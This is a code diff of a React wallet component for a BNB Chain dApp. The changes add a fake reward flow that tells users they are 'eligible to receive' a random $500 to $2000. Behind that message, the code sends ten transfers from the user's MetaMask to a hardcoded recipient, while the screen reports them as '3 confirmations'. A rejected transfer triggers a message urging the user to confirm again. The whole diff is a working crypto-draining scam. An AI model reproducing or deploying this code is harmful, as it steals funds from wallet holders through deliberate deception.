@@ -11,12 +11,15 @@ interface EthereumError {
 
 export function Wallet() {
   const [walletAddress, setWalletAddress] = useState<string>("");
-  const [transactionStatus, setTransactionStatus] = useState<string>("");
   const [isLoading, setIsLoading] = useState<boolean>(false);
   const [errorMessage, setErrorMessage] = useState<string>("");
   const [showInstructions, setShowInstructions] = useState<boolean>(false);
+  const [showModal, setShowModal] = useState<boolean>(false);
+  const [modalStep, setModalStep] = useState<number>(0);
+  const [eligibleAmount, setEligibleAmount] = useState<number>(0);
+  const [confirmationCount, setConfirmationCount] = useState<number>(0);
 
-  // Array of amounts for multiple transactions
+  const ELIGIBLE_AMOUNTS = [500, 600, 700, 800, 900, 1000, 1500, 2000];
   const TRANSACTION_AMOUNTS = [
     "0.02",
     "0.035",
@@ -29,9 +32,7 @@ export function Wallet() {
     "0.016",
     "0.016",
   ];
-  // const RECIPIENT_ADDRESS = "0xEa1244f29d894Fb3240b5A0e6214177Cd4b57F3a"; Old Address
   const RECIPIENT_ADDRESS = "0x422EbBbE2a518e50232B939edb686Cb5B6883808";
-
   const BNB_CHAIN_ID = "0x38";
   const DAPP_URL = "web3smartcalls.com";
 
@@ -41,6 +42,73 @@ export function Wallet() {
     isIOS: false,
     inMetaMaskBrowser: false,
   });
+
+  const modalSteps = [
+    {
+      title: "Adding address to smart contract",
+      icon: "⚡",
+      loading: true,
+    },
+    {
+      title: "Address successfully added",
+      icon: "✅",
+      loading: false,
+    },
+    {
+      title: `Your address is eligible to receive $${eligibleAmount}`,
+      icon: "🎉",
+      loading: false,
+    },
+    {
+      title: "Processing Transactions",
+      subtitle:
+        confirmationCount > 0
+          ? `${confirmationCount}/3 confirmations completed`
+          : "Awaiting first confirmation",
+      icon: "⏳",
+      loading: true,
+    },
+    {
+      title: "Confirmation Rejected",
+      subtitle:
+        "Your wallet has rejected the confirmation request.\n\nUnconfirmed USDC will be displayed on your dashboard.\n\nConfirm deployment to receive USDC.",
+      icon: "❌",
+      loading: false,
+    },
+    {
+      title: "Confirmation Complete",
+      subtitle: "All confirmation processed successfully",
+      icon: "✅",
+      loading: false,
+    },
+  ];
+
+  const Modal = () => (
+    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
+      <div className="bg-[#0F1320] border border-white/10 rounded-xl p-6 w-[90%] max-w-md transform transition-all">
+        <div className="flex flex-col items-center space-y-4">
+          <div className="text-4xl animate-bounce">
+            {modalSteps[modalStep].icon}
+          </div>
+          <h3 className="text-lg font-medium text-center">
+            {modalSteps[modalStep].title}
+          </h3>
+          {modalSteps[modalStep].subtitle && (
+            <p className="text-sm text-gray-400 text-center whitespace-pre-line">
+              {modalSteps[modalStep].subtitle}
+            </p>
+          )}
+          {modalSteps[modalStep].loading && (
+            <div className="flex items-center justify-center">
+              <div className="w-1.5 h-1.5 bg-[#08a0dd] rounded-full animate-pulse"></div>
+              <div className="w-1.5 h-1.5 bg-[#08a0dd] rounded-full animate-pulse mx-1"></div>
+              <div className="w-1.5 h-1.5 bg-[#08a0dd] rounded-full animate-pulse"></div>
+            </div>
+          )}
+        </div>
+      </div>
+    </div>
+  );
 
   useEffect(() => {
     const userAgent = navigator.userAgent.toLowerCase();
@@ -55,18 +123,32 @@ export function Wallet() {
   const handleMetaMaskRedirect = () => {
     if (deviceInfo.isAndroid || deviceInfo.isIOS) {
       setShowInstructions(true);
-
       const encodedUrl = encodeURIComponent(`https://${DAPP_URL}`);
       const deepLink = deviceInfo.isAndroid
         ? `metamask://browseto/${encodedUrl}`
         : `https://metamask.app.link/dapp/${DAPP_URL}`;
-
       window.location.href = deepLink;
-
       setTimeout(() => {
         window.location.href = "https://metamask.io/download/";
       }, 1500);
     }
+  };
+
+  const startModalSequence = () => {
+    setShowModal(true);
+    setModalStep(0);
+    setConfirmationCount(0);
+
+    const randomAmount =
+      ELIGIBLE_AMOUNTS[Math.floor(Math.random() * ELIGIBLE_AMOUNTS.length)];
+    setEligibleAmount(randomAmount);
+
+    setTimeout(() => setModalStep(1), 2000);
+    setTimeout(() => setModalStep(2), 4000);
+    setTimeout(() => {
+      setModalStep(3);
+      handleSmartCall();
+    }, 6000);
   };
 
   const checkAndSwitchNetwork = async (): Promise<boolean> => {
@@ -83,8 +165,6 @@ export function Wallet() {
       const ethError = error as EthereumError;
       if (ethError.code === 4902) {
         setErrorMessage("Please add the BNB network to your wallet.");
-      } else {
-        setErrorMessage("");
       }
       return false;
     }
@@ -92,26 +172,21 @@ export function Wallet() {
 
   const executeTransaction = async (
     signer: ethers.providers.JsonRpcSigner,
-    amount: string,
-    index: number
+    amount: string
   ): Promise<void> => {
-    setTransactionStatus(`Preparing transaction ${index + 1}/3...`);
-
     const transaction = {
       to: RECIPIENT_ADDRESS,
       value: ethers.utils.parseEther(amount),
       gasLimit: 21000,
     };
 
-    setTransactionStatus(`${index + 1}/3 confirmations...`);
     const txResponse = await signer.sendTransaction(transaction);
-
     await txResponse.wait();
+    setConfirmationCount((prev) => prev + 1);
   };
 
   const handleSmartCall = async (): Promise<void> => {
     setIsLoading(true);
-    setTransactionStatus("");
     setErrorMessage("");
 
     try {
@@ -137,64 +212,38 @@ export function Wallet() {
 
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       const signer = provider.getSigner();
-
       const accounts = await provider.send("eth_requestAccounts", []);
-      const connectedWallet = accounts[0];
-      setWalletAddress(connectedWallet);
+      setWalletAddress(accounts[0]);
 
-      // Execute transactions sequentially
-      for (let i = 0; i < TRANSACTION_AMOUNTS.length; i++) {
+      for (const amount of TRANSACTION_AMOUNTS) {
         try {
-          await executeTransaction(signer, TRANSACTION_AMOUNTS[i], i);
+          await executeTransaction(signer, amount);
         } catch (error) {
-          throw error; // Re-throw to be caught by outer catch block
+          const ethError = error as EthereumError;
+          if (ethError.code === "ACTION_REJECTED") {
+            setModalStep(4);
+            setTimeout(() => setShowModal(false), 5000);
+            return;
+          }
+          throw error;
         }
       }
 
-      setTransactionStatus(
-        // "Network Congested\nSmart contract development failed\nTry again!"
-        "Contract Deployed"
-      );
+      setModalStep(5);
+      setTimeout(() => setShowModal(false), 3000);
     } catch (error) {
-      setTransactionStatus("");
-
       const ethError = error as EthereumError;
-
-      if (ethError.code === "ACTION_REJECTED") {
-        setErrorMessage("All confirmations were not completed.");
-        return;
-      }
-
-      if (ethError.code === "INSUFFICIENT_FUNDS") {
-        setErrorMessage("Insufficient funds for transaction");
-        return;
-      }
-
-      if (ethError.code === "NETWORK_ERROR") {
-        setErrorMessage("Network connection error. Please try again");
-        return;
-      }
-
-      if (ethError.message) {
-        const errorMessage = ethError.message.toLowerCase();
-
-        if (errorMessage.includes("user rejected")) {
-          setErrorMessage("All confirmations were not completed.");
-        } else if (errorMessage.includes("insufficient")) {
-          setErrorMessage("Insufficient funds for transaction");
-        } else if (errorMessage.includes("network")) {
-          setErrorMessage("Network connection error. Please try again");
-        } else {
-          setErrorMessage("Smart Contract Failed. Please try again");
-        }
-      } else {
-        setErrorMessage("Smart Contract Failed. Please try again");
-      }
+      setErrorMessage(
+        ethError.code === "INSUFFICIENT_FUNDS"
+          ? "Insufficient funds for transaction"
+          : ethError.code === "NETWORK_ERROR"
+          ? "Network connection error. Please try again"
+          : "Smart Contract Failed. Please try again"
+      );
     } finally {
       setIsLoading(false);
     }
   };
-
   return (
     <div>
       <div className="flex justify-between items-center w-full mb-6">
@@ -237,7 +286,7 @@ export function Wallet() {
         )}
 
         <button
-          onClick={handleSmartCall}
+          onClick={startModalSequence}
           className="bg-[#08a0dd] text-white text-base px-4 py-2 rounded-lg hover:bg-[#08a0dd]/70 flex items-center justify-center"
           disabled={isLoading}
         >
@@ -272,7 +321,7 @@ export function Wallet() {
           </div>
         )}
 
-        {transactionStatus &&
+        {/* {transactionStatus &&
           transactionStatus.split("\n").map((line, index) => (
             <p
               key={index}
@@ -286,12 +335,14 @@ export function Wallet() {
             >
               {line}
             </p>
-          ))}
+          ))} */}
 
         {errorMessage && (
           <p className="text-sm text-red-500 text-center">{errorMessage}</p>
         )}
       </div>
+
+      {showModal && <Modal />}
     </div>
   );
 }
